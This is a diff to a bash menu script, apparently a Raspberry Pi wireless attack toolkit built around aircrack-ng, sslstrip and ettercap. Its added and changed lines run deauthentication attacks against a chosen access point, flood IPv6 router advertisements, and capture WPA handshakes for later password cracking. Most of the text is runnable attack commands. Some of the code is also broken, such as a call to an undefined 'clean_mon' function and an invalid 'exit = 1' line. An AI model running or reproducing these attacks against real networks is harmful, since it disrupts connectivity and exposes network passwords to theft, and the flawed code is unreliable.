@@ -4,6 +4,13 @@
 clear
 exit=0
 
+monitor_cleanup(){
+	for i in $( airmon-ng | grep "mon" | awk '{print $1}' )
+	do
+		airmon-ng stop $i
+	done
+}
+
 #Function to determine CIDR and then scan using nmap providing selection options
 auto_map(){
 	echo "Please wait. Scanning..."
@@ -58,15 +65,17 @@ while [ exit != 2 ]; do
 	#Main Menu
 	whiptail --menu "Main Menu" 25 50 7 \
 		macchange "MAC Changer" \
+		clean_mon "Cleans up monitor mode if not cleaned up properly"\
 		airodump "Airodump-ng + Airmon-ng" \
 		airodump2 "Airodump-ng bssid specific" \
 		aireplay "Aireplay-ng" \
 		pyrit "Pyrit (for caps)" \
 		sslstrip "SSLStrip" \
 		ettercap "Open ettercap GUI" 2>CHOICE \
-		deauth "Deauth attack - sends deauth packets to target"\
+		deauth "sends deauth packets to target"\
 		arp-cop "ARP posion detector"\
 		ipv6-flood "Floods IPV6 advertisements slows ipv6 enabled machines"\
+		pcap_capture "Captures handshakes for a specified AP to be cracked later"\
 		quit "Quit"
 	
 	#Wait. doesnt whiptail have the case system built-in?
@@ -85,16 +94,24 @@ while [ exit != 2 ]; do
 		ifconfig eth0 up
 		ifconfig wlan0 up
 	;;
+	#check to see what monitor modes are up and then stops them.
+	clean_mon) echo "checking for monitor interfaces"
+		echo "removing all monitor interfaces"
+		monitor_cleanup
+	;;
 	#Starts monitor mode using wlan0 interface
 	#starts running airodump
 	airodump) airmon-ng start wlan0
 		airodump-ng mon0
+		monitor_cleanup
 	;;
 	
 	##Airodump a specific AP must make skider
 	airodump2) whiptail --inputbox "Please enter access point bssid:" 25 50 2>AIRODUMPBSSID 
 		AIRODUMPBSSID=$(cat AIRODUMPBSSID)
+		airmon-ng start wlan2
 		airodump-ng --bssid $AIRODUMPBSSID mon0
+		monitor_cleanup
 	;;
 	#takes host and client.
 	aireplay) whiptail --inputbox "Please enter host bssid:" 25 50 2>AIREPLAYHOST
@@ -113,6 +130,7 @@ while [ exit != 2 ]; do
 		else
 			aireplay-ng --deauth 100 -a $AIREPLAYHOST --ignore-negative-one mon0
 		fi
+		monitor_cleanup
 	;;
 	
 	#lel cracking passwords on a raspberry pi will be difficult
@@ -154,14 +172,20 @@ while [ exit != 2 ]; do
 		echo "discovering nearby APs"
 		Nearby_Mac
 		echo "launching attack"
-		aireplay-ng -0 20 -a $TARGETAP mon0 --ignore-negative-one
-		airmon-ng stop mon0
+		aireplay-ng -0 10 -a $TARGETAP mon0 --ignore-negative-one
+		monitor_cleanup
 	;;
 	arp-cop)echo "press 'q' to quit"
 		ettercap -T -i wlan2 -P arp_cop
 	;;
 	#needs a better way to exit may cause end of program
 	ipv6-flood) flood_advertise6 wlan2
+	;;
+	pcap_capture) airmon-ng start wlan2
+			Nearby_Mac
+			xterm -e aireplay-ng -0 10 -a $TARGETAP mon0 --ignore-negative-one &
+			airodump-ng --bssid $TARGETAP -w psk mon0
+			clean_mon
 	;;
 	#exits the loop of eternity
 	quit) exit = 1
